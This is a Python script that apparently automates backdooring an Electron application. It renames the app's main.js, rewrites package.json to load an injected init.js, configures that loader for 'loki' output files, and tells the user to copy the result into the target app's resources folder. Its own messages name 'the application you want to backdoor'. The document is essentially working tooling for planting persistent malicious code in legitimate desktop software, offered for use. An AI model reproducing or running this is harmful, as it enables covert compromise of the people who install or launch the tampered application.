import os
import sys
import json
import zipfile

init_file = "init.js"


def read_json_file(path):
    try:
        with open(path, 'r', encoding='utf-8') as file:
            data = json.load(file)
            return data
    except Exception as e:
        print("There is an issue reading JSON file:", e)
        return None


def create_init_setup_json(original_json_path, js_file_path):
    org_json = read_json_file(original_json_path)
    if org_json is None:
        print("No data to process.")
        return

    private_org = org_json.get("private")
    type_org = org_json.get("type")
    main_org = org_json.get("main")

    loki_org = None
    if main_org == 'main.js':
        try:
            os.rename('app/main.js', 'app/res.js')
            print("[+] Renamed 'main.js' to 'res.js'")
        except FileNotFoundError:
            print("[-] main.js not found, cannot rename.")
        loki_org = input("Enter a name for the loki main file as there is collision in the file name(format:fileName.js): ")

    print(f"private: {private_org}, type: {type_org}, main: {main_org}, loki file:{loki_org}")

    replacements = {
        'lokiPackageJson.private': 'true' if private_org else 'false',
        'lokiPackageJson.type': f"'{type_org}'" if isinstance(type_org, str) else 'module',
        'lokiPackageJson.main': f"'{main_org}'" if main_org else "''",
        'initPackageJson.main': f"'main.js'" if loki_org is None else f"'{loki_org}'"
    }

    replace_data_save_json(org_json)
    replace_js_lines(js_file_path, replacements)


def replace_data_save_json(json_data):
    json_data['main'] = "init.js"
    json_data.pop('private', None)
    json_data.pop('type', None)

    try:
        with open('app/package.json', 'w', encoding='utf-8') as f:
            json.dump(json_data, f, indent=2)
        print(f"[+] Saved updated JSON to: app/package.json")
    except Exception as e:
        print(f"[-] Failed to save JSON: {e}")


def replace_js_lines(js_file_path, replacements):
    try:
        with open(js_file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
    except Exception as e:
        print(f"[-] Failed to read JS file: {e}")
        return

    new_lines = []
    for line in lines:
        stripped = line.strip()
        replaced = False
        for var_name, new_val in replacements.items():
            if stripped.startswith(f"{var_name} ="):
                indent = line[:len(line) - len(line.lstrip())]
                new_line = f"{indent}{var_name} = {new_val};\n"
                new_lines.append(new_line)
                print(f"Replaced line for '{var_name}': {new_line.strip()}")
                replaced = True
                break
        if not replaced:
            new_lines.append(line)

    try:
        with open('app/init.js', 'w', encoding='utf-8') as f:
            f.writelines(new_lines)
        print("[+] The init.js is stored in the app directory")
    except Exception as e:
        print(f"[-] Failed to write JS file: {e}")


def zip_folder(folder_path, output_zip):
    try:
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, start=folder_path)
                    zipf.write(full_path, arcname)
        print(f"[+] Zipped '{folder_path}' to '{output_zip}'")
    except Exception as e:
        print(f"[-] Failed to zip folder: {e}")


if __name__ == "__main__":
    print("[!!!!!] Don't edit the init.js in this folder")
    print("[!] Have the loki output files (app/) in the current folder before starting the Script")
    print("[!] It's advised to have the package.json file for the application you want to backdoor in the current directory")

    if not os.path.isdir("app"):
        print("[-] The 'app' folder is not found in the current directory. Please place it here and rerun.")
        sys.exit(1)

    answer = input("\n[?] Have you done the steps (Y/N): ").strip().lower()
    if answer != 'y':
        print("[-] Complete the above steps and run the script")
        sys.exit(1)

    json_path = input("Enter path to PACKAGE JSON file: ").strip()
    if not os.path.isfile(json_path):
        print("[-] The provided path does not exist or is not a file.")
        sys.exit(1)

    if not os.path.isfile(init_file):
        print(f"[-] '{init_file}' not found in the current directory.")
        sys.exit(1)

    create_init_setup_json(json_path, init_file)

    print("\n[+] The Setup is done. Copy all files inside the 'app/' folder to your ELECTRONAPP/resources/app/ folder.\n")

    zip_answer = input("[?] Do you need to zip the folders (Y/n): ").strip().lower()
    if zip_answer == 'y' or zip_answer == '':
        zip_folder('app', 'app.zip')
        print("[+] Zipped folder is stored at ./app.zip")
    else:
        print("[*] Skipped zipping.")
